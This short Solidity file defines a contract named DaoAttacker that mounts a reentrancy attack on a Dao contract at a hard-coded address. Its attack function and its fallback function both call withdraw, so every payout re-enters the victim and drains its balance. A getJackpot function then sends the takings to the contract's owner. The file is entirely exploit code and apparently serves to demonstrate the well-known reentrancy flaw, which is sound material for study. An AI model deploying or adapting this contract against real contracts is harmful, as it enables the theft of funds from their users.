pragma solidity ^0.4.8;

import "./Dao.sol";

contract DaoAttacker {
    
    Dao public dao = Dao(0x56e89E8616e9ace7807fa06EF64E3561936765C5);
    address _owner;

    function DaoAttacker(){
        _owner = msg.sender;
    }

    function attack() {
        dao.withdraw(dao.queryCredit(this));
    }

    function(){
        dao.withdraw(dao.queryCredit(this));
    }

    function getJackpot(){
        _owner.send(this.balance);
    }
}